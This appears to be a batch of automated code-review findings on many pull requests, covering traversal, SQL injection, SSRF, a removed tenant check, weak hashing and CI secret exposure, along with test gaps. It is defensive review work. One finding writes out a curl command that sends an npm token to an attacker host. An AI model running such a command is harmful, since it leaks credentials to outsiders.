Provider-side throttling is typically applied to the whole sending account and manifests as a dropped/queued message or a 4xx from the provider, not as a per-caller error at this layer. `request_reset` calls `send_reset_email(email)` and then unconditionally returns `{"sent": True}` with no inspection of the result, so once the provider starts throttling, every caller — including legitimate users whose reset mail was never delivered — still gets a success response, and nothing surfaces the condition. If the application-level bound is going away, at minimum check the return value/exception from `send_reset_email` and reflect a delivery failure in the response or in logs, rather than hard-coding success.

findings.title: Preview path skips _confined(), allowing traversal outside EXPORT_ROOT
findings.body:
`read_export` (line 14) resolves the caller-supplied `name` through `_confined(name)` before opening it; `read_export_preview` joins `name` straight onto `EXPORT_ROOT` with `os.path.join`. `os.path.join` does not constrain the result: a `name` containing `../` walks out of the export directory, and an absolute `name` (e.g. `/etc/passwd`) discards `EXPORT_ROOT` entirely, so the first 4096 bytes of an arbitrary readable file are returned. The PR description says the preview path "reuses the same layout as download", which is exactly the invariant that is broken here. Route `name` through `_confined()` before opening, so both entry points share one containment check:

    path = _confined(name)
    with open(path, "rb") as fh:
        return fh.read(limit)

_Also raised by the security agent:_ Preview path skips _confined(), allowing arbitrary file read

findings.title: Public function name does not signal path validation bypass
findings.body: The function `read_export_preview` has a name and signature that do not document that it skips the `_confined()` path validation applied by the existing `read_export` function on line 14. A caller familiar with `read_export` (which validates the path) could reasonably assume `read_export_preview` does the same, and pass untrusted input to the `name` parameter, believing it safe. The name 'preview' does not clearly signal that the security contract has changed.

findings.title: No test would catch preview path skipping _confined()
findings.body: read_export_preview builds its path via os.path.join(EXPORT_ROOT, name) directly, unlike the sibling function which calls _confined(path) first. No test in this diff exercises read_export_preview with a traversal-style name (e.g. '../secret') to confirm it is rejected or confined the same way as the download path. If this omission is a genuine bug, nothing here would fail to reveal it.

findings.title: Ownership check removed from bulk_export enables cross-tenant reads
findings.body:
`bulk_export` now fetches every `Report` named in the caller-supplied `report_ids` and serialises it with no tenant check. The removed loop called `require_owner(user, report)`, which per its own docstring is the mandatory gate for "every object read or mutation of another tenant's data".

Adversary: any authenticated user (the lowest-privileged account in any tenant). What they control: the `report_ids` list in the request body. What they get: the full `to_dict()` contents of arbitrary reports belonging to other tenants, enumerable by iterating IDs — and bulk_export makes enumeration cheap, since many IDs can be requested per call.

Authentication (`current_user`) is not authorisation. Restore the check. If the loop was a performance problem, keep the invariant and push it into the fetch — e.g. a single query filtered by `tenant_id == user.tenant_id` over `report_ids`, then assert the returned count matches the requested count (or drop/404 the missing ones) rather than dropping the check entirely.

_Also raised by the correctness agent:_ bulk_export no longer verifies report ownership per object

findings.title: Removed authz check in bulk_export has no regression test
findings.body: The diff removes the require_owner(user, report) call inside bulk_export, meaning a user can now request report_ids belonging to another tenant and receive their data. There is no test file in this PR exercising bulk_export with cross-tenant report_ids, so a test that would have failed on this exact regression (an authorization test asserting Forbidden is raised, or that only same-tenant reports are returned) does not exist. If this removal is unintentional or gets reverted incorrectly in the future, nothing in the test suite would catch it.

findings.title: Removed authorization contradicts documented requirement
findings.body: The `require_owner` function's docstring states: 'Every object read or mutation of another tenant's data must go through this.' The bulk_export function now reads Report objects (line 6) without the required authorization check, directly violating this documented contract. The PR description conflates authentication (verifying who the user is) with authorization (verifying what they can access). Current authentication does not establish tenant-level authorization.

findings.title: search_customers interpolates values into SQL, breaking execute()'s contract
findings.body:
`billing.db.execute` documents that `params` must carry every caller value, and the sibling `get_customer` on line 5 follows that by passing `(customer_id,)` with a `%s` placeholder. `search_customers` instead formats `term` and `status` directly into the SQL text and calls `execute(sql)` with no params. Consequences, beyond the obvious SQL injection: a term such as `O'Brien` terminates the string literal and raises a syntax error, and a term containing `%` or `_` is silently treated as a LIKE wildcard rather than a literal, returning wrong rows. Rewrite as a parameterised query, e.g. `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))`, escaping LIKE metacharacters in `term` if literal matching is intended.

_Also raised by the security agent:_ SQL injection: search_customers interpolates term/status into SQL

findings.title: Public function violates documented parameter contract
findings.body: `search_customers` is a public function that calls the `execute()` helper. The docstring of `execute()` explicitly states that "params must carry every caller value", establishing a contract that all values passed to the database layer must be parameterized. This function violates that contract by constructing SQL with string interpolation (f-string), passing an unsanitized `sql` string with no `params` argument to `execute()`. A caller reading the function name and the established pattern in `get_customer()` would expect parameters to be handled safely.

findings.title: New search_customers function has no test coverage
findings.body: search_customers is new, user-facing logic (query construction from `term` and `status`) with no accompanying test. If the interpolation logic were wrong — e.g. malformed SQL, incorrect LIKE escaping, or injection-prone string building — nothing in the suite would fail. There is at least a sibling function (get_customer) that presumably has similar informal coverage; this function lacks any equivalent.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check the send path enforces
findings.body:
The function immediately above validates the destination host against `ALLOWED_HOSTS` before issuing a request (lines 8-10). `verify_endpoint` takes the same kind of tenant-supplied URL and issues a request with no such check, so the invariant "we only ever fetch allowed hosts" no longer holds for this module. Since the URL comes from customer webhook registration, this lets a tenant make the service issue GETs to arbitrary internal addresses (link-local metadata, loopback admin ports) and observe the status code, which is returned to the caller. Route this through the same host validation used on line 8 (and disable redirect following, since `requests` follows redirects by default and a permitted host can 302 to an internal one).

_Also raised by the security agent:_ verify_endpoint performs SSRF: no ALLOWED_HOSTS check on tenant URL

findings.title: verify_endpoint has no test and skips host allowlist check
findings.body: verify_endpoint issues a GET to an arbitrary URL without checking ALLOWED_HOSTS (unlike the existing POST path above it), and no test exists to pin down its intended behavior (e.g. that it should validate the host, or what it returns on failure). If someone later changes this function incorrectly, nothing in the suite would fail.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A verification helper is normally called to find out whether a customer-supplied endpoint is reachable, but any transport failure (`ConnectionError`, `Timeout`, invalid URL -> `MissingSchema`/`InvalidURL`) propagates out of the expression on line 14 rather than producing a result. The unreachable case — the most likely outcome for a freshly registered URL — is exactly the one that never returns a status code. Catch `requests.RequestException` and return a sentinel/`None`, or document that callers must handle it.

findings.title: Customer invoices bucket created with all public access blocks disabled
findings.body:
`aws_s3_bucket.invoices` (`acme-customer-invoices`) is created and immediately paired with an `aws_s3_bucket_public_access_block` that sets all four guardrails to `false`. Those four settings are the account/bucket-level backstop that makes any public ACL or public bucket policy ineffective; turning them all off means any ACL grant to `AllUsers`/`AuthenticatedUsers` or any `Principal: "*"` bucket policy — added now, later, by another module, or by a console user — takes effect immediately and anonymously exposes invoice objects.

Adversary: any unauthenticated internet user who can guess or enumerate the bucket name (`acme-customer-invoices` is highly guessable). What they control: nothing — they only need one permissive ACL/policy to exist or be introduced. What they get: customer billing documents (names, addresses, amounts, possibly tax IDs).

Recommended: set `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `true` for the invoices bucket, and add default SSE plus a deny-insecure-transport policy. If this bucket genuinely needs to exist here at all — the PR describes only a public marketing assets bucket, so the invoices resource appears to be unrelated scope that a reviewer skimming the title would not expect.

findings.title: New resource is a customer-invoices bucket, not the described assets bucket
findings.body:
The PR describes adding "the public assets bucket for the marketing site", but the resource actually added is `aws_s3_bucket.invoices` named `acme-customer-invoices`, paired with an `aws_s3_bucket_public_access_block` that sets all four guards (`block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`) to `false`. Applying this makes a bucket whose name indicates customer billing records eligible to be made public by any future ACL or bucket policy — the opposite of what the description implies is being changed.

If a customer-invoices bucket is genuinely needed, it should be a separate, clearly described change and should keep the public access block at the default `true` on all four settings (or omit the block resource entirely, since S3 now blocks public access by default). Only the `assets` bucket, if anything, should carry the disabled block.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same hex digest as `verify_stripe` but returns `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the signature an attacker guessed correctly, allowing a forged signature to be recovered byte-by-byte over repeated requests. Replace with `hmac.compare_digest(expected, header)` to match line 7.

Secondary note: `compare_digest` also raises `TypeError` on a non-str/bytes header, whereas `==` silently returns `False` — switching keeps the two providers behaving identically on malformed input.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: verify_acmepay is a new authentication-relevant function (webhook signature verification) added in this diff, but no test file accompanies the change. Nothing would catch a logic bug here — e.g. it uses `==` instead of `hmac.compare_digest` unlike its sibling verify_stripe, and no test exercises either the correct-signature or incorrect-signature path to confirm the function behaves as intended.

findings.title: Exception text and traceback returned in 500 response body
findings.body:
`handle()` now serialises `str(exc)` and `traceback.format_exc()` into the response body returned with status 500. Any unauthenticated client who can make the service throw — a malformed parameter, an oversized payload, a type confusion in a query string — gets back absolute filesystem paths, module and package layout, source lines from the frames, and the raw exception message. Exception messages from database and HTTP client libraries routinely embed the failing SQL, internal hostnames, and sometimes credentials from connection strings; `IntegrityError` and `OperationalError` in particular echo table and column names. That turns a single fuzzed request into a map of the internals and materially shortens the reconnaissance phase of a real attack.

The stated goal — on-call visibility without SSHing in — is already served by the `log.exception("request failed")` on line 8, which captures the same traceback in the log sink. Keep the client-facing body opaque and correlate via an identifier instead:

```python
def handle(exc):
    error_id = uuid.uuid4().hex
    log.exception("request failed", extra={"error_id": error_id})
    return {"error": "internal error", "error_id": error_id}, 500
```

If verbose bodies are genuinely wanted in a sandbox, gate them on an explicit non-production config flag that defaults to off, rather than on unconditionally.

_Also raised by the correctness agent:_ format_exc() uses ambient exception, not the passed-in exc

_Also raised by the correctness agent:_ 500 response body shape and value changed for existing callers

findings.title: No test covers the new error response payload
findings.body: The handle() function now returns exception details and a traceback in the response body, a significant change to the API contract on error paths. No test file is included in this diff, so nothing would fail if this behavior were reverted, changed to leak different fields, or broken in some other way (e.g., traceback.format_exc() called outside an except block returning 'NoneType: None').

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password digest with a single unsalted MD5 pass, while `hash_password` two lines above uses `bcrypt.hashpw` with a generated salt. MD5 is a fast, GPU-friendly hash: an attacker who obtains whatever store these digests land in can recover the underlying passwords with rainbow tables or brute force at billions of guesses per second, and the absence of a salt means identical reset passwords produce identical digests so one crack covers every matching account. Because a reset password is generally exchanged for a real session, this undermines the bcrypt protection on the main path too.

Use the same primitive as `hash_password` — `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` — or, if this value is a one-time reset token rather than a user-chosen password, generate it with `secrets.token_urlsafe` and store it under a per-token salted hash with an expiry, not MD5.

Adversary: anyone who reads the credential store (SQL injection, backup leak, insider, stolen dump). What they control: nothing — they only need read access to the digests. What they get: the plaintext reset passwords and therefore account takeover.

findings.title: Reset path stores a hash format bcrypt verification cannot read
findings.body:
`hash_password` returns a bcrypt modular-crypt string (`$2b$...`), while `hash_reset_password` returns a 32-char hex MD5 digest. Both evidently feed the same stored-password column, but the values are not interchangeable: `bcrypt.checkpw(raw, stored)` against an MD5 hex string will not match (and in some bcrypt bindings raises `ValueError: invalid salt`), so a user who completes a password reset is left unable to log in — or the verifier has to branch on hash format, which is itself a correctness hazard. If a reset genuinely needs a different representation, it should still go through `bcrypt.hashpw` (unsalted MD5 is also not an acceptable password hash); if this value is meant to be a short-lived reset *token* digest rather than a password, it is misnamed and should not share the password storage path.

I cannot see the verification function or the reset caller, so confidence reflects that assumption about unseen code.

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password is a new public function that determines how reset-password credentials are hashed, but no test exercises it. Nothing would fail if this function were changed to hash incorrectly, return the raw password, or otherwise break — a regression here would go unnoticed until it affects production password resets.

findings.title: pull_request_target runs forked PR code with secrets (pwn request)
findings.body:
`pull_request_target` runs the job in the context of the base repository: it has access to repository secrets and a read/write `GITHUB_TOKEN`, even for pull requests opened from forks by users with no write access. That is only safe as long as the job never executes code from the pull request.

This diff does the opposite on both counts:

- Line 11-12 replaces the default checkout (base branch) with `ref: ${{ github.event.pull_request.head.sha }}`, pulling the attacker's tree into the privileged workspace.
- Line 13 then runs `./scripts/measure.sh` — a file that came from that checkout, so its contents are whatever the PR author wrote. Note that a fork PR can also modify anything the script sources, plus lockfiles / `package.json` lifecycle hooks it may invoke.
- Line 14-15 places `secrets.NPM_TOKEN` directly in that step's environment.

Adversary: anyone on the internet who can open a pull request. What they control: the entire contents of `scripts/measure.sh` at `head.sha`. What they get: the npm publish token (trivially exfiltrated with `curl -d "$NPM_TOKEN" attacker.example`), plus the workflow's `GITHUB_TOKEN`, which under `pull_request_target` defaults to write scopes — enough to push commits, alter releases, or comment as the repo.

To give forks the same CI signal safely, pick one of:

1. Revert to `pull_request`. Fork PRs run with a read-only token and no secrets, which is exactly the isolation you want for running contributor code. If the size check genuinely needs no secrets, this is the whole fix — drop the `NPM_TOKEN` env block too.
2. If a secret really is required, split into two workflows: an unprivileged `pull_request` job that checks out the PR and writes the measurement to an artifact, and a `workflow_run` job that consumes the artifact with the secret but never executes PR code.

If `pull_request_target` is kept for any reason, at minimum do not check out `head.sha`, do not run scripts from the PR tree, and add an explicit `permissions:` block reducing `GITHUB_TOKEN` to `contents: read`.

_Also raised by the correctness agent:_ pull_request_target runs forked PR code with secrets (pwn request)

findings.title: json.dumps narrows accepted contexts; previously any hashable value worked
findings.body:
The old key was `(template_source, tuple(sorted(context.items())))`, which accepted any hashable context value — `datetime`, `Decimal`, enums, frozensets, arbitrary objects with `__hash__`. `json.dumps` accepts only JSON-native types and raises `TypeError: Object of type X is not JSON serializable`. Any existing caller passing such a value goes from a working cached render to an uncaught exception at the very first line of the function, before `_render` is even reached.

Additionally, `sort_keys=True` raises `TypeError: '<' not supported between instances of 'str' and 'int'` for a context with mixed-type keys, which the old `sorted(context.items())` also would have hit — but only if the values were comparable; the failure surface is not identical.

If digest keying is required, use a serialiser with a `default=` fallback (e.g. `default=repr`) or fall back to the tuple key when serialisation fails.

findings.title: New tests pass on the old implementation too; they don't cover the change
findings.body: Both new tests already pass against the previous key `(template_source, tuple(sorted(context.items())))` — insertion order was normalised by `sorted`, and differing values produced differing tuples. So neither test distinguishes the new digest key from the old one, and neither covers the behaviour the change actually alters: non-JSON-serialisable context values, and contexts that serialise identically (e.g. `{1: "x"}` vs `{"1": "x"}`). Add a case for a context value that is hashable but not JSON-serialisable, and one asserting two renders for int-keyed vs string-keyed contexts.

findings.title: Switch to json.dumps changes key requirements, untested
findings.body: The cache key previously required `context` values to be hashable/sortable (`tuple(sorted(context.items()))`); it now requires the whole `[template_source, context]` structure to be JSON-serializable via `json.dumps`. Any caller passing context values that are hashable but not JSON-serializable (e.g. datetime objects, custom classes, sets) will now raise a TypeError where the old code worked. None of the new tests use a non-trivial context value, so this behaviour change is untested and would go uncaught.

findings.title: `spy` fixture is not defined in this change; test may error or really run tar
findings.body:
`test_runs_without_a_shell` requests a `spy` fixture, but no `conftest.py` or fixture definition is added in this PR. If the fixture does not already exist in the repo, pytest fails the test with `fixture 'spy' not found`. Worse, if `spy` exists but does not patch `subprocess.run`, this test genuinely shells out `tar -czf /exports/nightly.tar.gz -- /srv/data` on the test machine and will fail (or write real files) depending on whether `/exports` and `/srv/data` exist. Add the fixture (or an explicit `monkeypatch`/`mock.patch` of `subprocess.run`) alongside the test.

_Also raised by the tests agent:_ Test only checks shell=False, not the actual argv content

findings.title: New name allowlist rejects names the old signature accepted
findings.body: `create_archive` previously accepted any `name` and interpolated it into the shell command, so callers could legitimately pass names containing dots, spaces, or other punctuation (e.g. `"report.2024-05"`, `"customer data"`, or anything longer than 64 characters). The new `SAFE_NAME.fullmatch` gate turns every one of those into a `ValueError` at runtime rather than producing an archive. Similarly, `directory` was previously word-split by the shell, so a caller passing `"/srv/a /srv/b"` archived two trees; it is now a single argv element and tar will fail with a not-found error. Please confirm against the actual call sites what name and directory shapes are in use, and either widen the pattern (e.g. allow `.` and a longer bound) or update the callers in the same change.

findings.title: `directory` reaches tar unvalidated — arbitrary path can be archived
findings.body:
`name` is now allowlisted, but `directory` is passed straight through to `tar` with no checks. The `--` correctly prevents it from being parsed as an option, so this is not argument injection; the exposure is that whatever path is supplied is what gets archived. If `directory` is reachable from a request parameter, a caller can pass `/root`, `/etc`, or an app config directory and the resulting `/exports/<name>.tar.gz` contains those files — and archives in a well-known export directory are typically retrievable afterwards.

Suggest constraining `directory` the way `name` now is: resolve it (`os.path.realpath`) and assert it sits under an expected export root before invoking tar. Separately, since a valid `name` fully determines the output path, a repeated call silently overwrites an existing archive; consider `os.O_EXCL`-style creation if archives are meant to be immutable.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render() on an empty invoice but never asserts anything about the result — the return value is discarded. It will pass regardless of what render() produces for an empty invoice, including a crash-free but wrong output, or even silently returning None. Add an assertion on the actual rendered output (e.g. expected empty/blank format).

_Also raised by the correctness agent:_ test_renders_empty_invoice asserts nothing

findings.title: Test only checks mock call_count, not rendered output
findings.body:
test_renders_line_items mocks format_line and asserts only that it was called twice. It never checks what render() actually returns or that the formatted output is incorporated correctly. If render() dropped the formatted lines entirely, or concatenated them wrong, or called format_line with wrong arguments, this test would still pass. Assert on the actual rendered string content instead of the mock's call count.

_Also raised by the correctness agent:_ Line-item test verifies only the mock, not the rendered output

findings.title: Failing boundary test deleted with no accompanying rounding fix
findings.body:
`test_rounds_half_to_even` was the only test exercising the exact-half boundary (`Decimal("2.345")`), which is precisely where rounding implementations differ (ROUND_HALF_EVEN vs ROUND_HALF_UP vs binary-float drift). The PR title says the rounding was fixed, but this diff touches only the test file \u2014 no `round_cents` implementation change is present. Either the fix belongs in this PR and is missing, or the test should have been rewritten to assert the new intended behaviour (e.g. `round_cents(Decimal("2.345")) == Decimal("2.35")`) rather than deleted. Deleting it leaves the half-cent case silently unguarded while the remaining tests only cover strictly-above-half inputs.

_Also raised by the tests agent:_ Rounding fix for 2.345 has no test after deletion

findings.title: Patch targets notify.transport.deliver, which sender.py does not look up
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so the name `deliver` is bound in `notify.sender`'s module namespace at import time. Patching `notify.transport.deliver` rebinds only the attribute on the `notify.transport` module; `send_with_retry` continues to call the original function object it captured. This test therefore invokes the real transport (up to three times, with a live message), and only passes if the real `deliver` happens to return a falsy value — it does not verify the retry/give-up logic at all, and it will silently stop being a regression test if the real behaviour changes.

Use the same target as the passing test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also capturing the mock and asserting `mock.call_count == 3`, since that is the actual behaviour the test name claims to cover.

_Also raised by the tests agent:_ Mock patches notify.transport.deliver, but sender.py imports it by value

findings.title: Test patches wrong target despite documented warning
findings.body: The test `test_send_gives_up_after_three_failures` attempts to patch `notify.transport.deliver`, but the docstring in notify/sender.py explicitly states this will not work. The module imports `deliver` at import time (`from notify.transport import deliver`), which binds it into the module's namespace and makes patching the source location ineffective. The test should patch `notify.sender.deliver` instead, as demonstrated by the correct approach in `test_send_returns_true_on_first_success` on line 2.

findings.title: csv_rows emits unescaped fields, bypassing csv_escape
findings.body: `csv_rows` joins `str(r.get(c, ""))` values with commas directly. Any cell value containing a comma or a double quote produces a line with the wrong number of fields (or unbalanced quotes) that no CSV parser will read back correctly. The escaping helper needed for this is defined immediately below in the same commit but is never called. Wrap each value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. The same omission applies to `csv_header`, which joins column names raw.

findings.title: csv_escape misses newlines and assumes a str argument
findings.body:
RFC 4180 requires a field to be quoted if it contains a comma, a double quote, *or* a line break (CR/LF). `csv_escape` checks only the first two, so a value containing `\n` is emitted raw and silently splits the record into two lines. Add `"\n" in value or "\r" in value` to the condition. Separately, the membership tests raise `TypeError` for any non-`str` input (e.g. an `int` cell value), so callers must stringify first — either coerce inside the function with `value = str(value)` or document the precondition.

_Also raised by the security agent:_ csv_rows joins raw values without applying csv_escape

findings.title: New CSV/JSON/PDF helper functions ship without any tests
findings.body: The repo has an established pattern of testing exporter functions (test_csv.py tests csv_header). This PR adds csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, and usable_width — all public entry points with non-trivial logic (escaping rules, chunking boundaries, margin arithmetic) — but none are covered by any test in the diff. A bug in comma/quote escaping, chunk boundary math, or margin calculation would go undetected.

findings.title: Test is time-dependent and fails across the UTC midnight boundary
findings.body:
`test_token_issued_today_is_valid` compares `token.issued_at.date()` against `datetime.now(timezone.utc).date()` evaluated at a later instant. If `issue_token()` runs just before 00:00:00 UTC and the assertion evaluates just after, the two dates differ and the test fails for no reason related to the code under test. The same applies to `is_expired(token.expires_at)`, which resolves "now" internally at an uncontrolled instant.

Follow the pattern already used on lines 4-6: pin the clock. Inject a fixed `issued`/`now` (e.g. `issue_token(now=fixed)` if supported, or freeze/patch the clock) and assert on exact values, so the test deterministically exercises the expiry window rather than the time of day the suite happens to run.

_Also raised by the tests agent:_ New test relies on real wall-clock time, making it flaky

findings.title: is_expired() called without the `now` argument the sibling test passes
findings.body: The existing test on line 6 calls `is_expired(expires_at, now=...)` with `now` supplied explicitly. Line 12 omits it. If `now` is a required keyword-only parameter rather than one with a default, this call raises `TypeError` and the test never reaches a meaningful assertion. Please confirm `is_expired` defines a default for `now`; if it does not, pass an explicit instant here (which is desirable anyway for determinism).

findings.title: No test covers the expired-coupon rejection path
findings.body:
apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, exercising only the non-expired path. If the comparison logic were reversed, off-by-one, or the exception were never raised, no test would fail. Add a test that constructs a coupon with expires_at in the past and asserts CouponExpired is raised.
